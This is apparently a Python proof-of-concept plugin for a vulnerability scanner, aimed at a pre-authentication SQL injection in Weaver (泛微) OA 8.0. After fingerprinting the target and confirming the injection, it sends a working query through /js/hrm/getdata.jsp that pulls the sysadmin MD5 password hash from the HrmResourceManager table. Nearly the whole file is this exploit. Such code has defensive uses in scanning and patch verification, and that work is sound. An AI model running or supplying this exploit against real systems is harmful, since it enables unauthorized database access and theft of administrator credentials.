# -*- coding:utf-8 -*-
# 泛微OA8.0 SQL注入
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests

vul_path_8 = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id"
pwd_path = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def wui_sql(self, url):
        resp = self.requestUtil.get(url + vul_path_8)
        if "1234" in resp.text:
            resp = self.requestUtil.get(url + pwd_path)
            return ["泛微OA8.0 前台SQL注入", "用户名: %s<br>MD5密码: %s" % ("sysadmin", resp.text)]
        else:
            return []

    def fingerprint(self):
        try:
            if not self.service.url == "" and "/help/sys/help.html" in self.requestUtil.get(self.service.url).text:
                return True
        except:
            return False

    def poc(self):
        try:
            return self.wui_sql(self.service.url)
        except:
            return []
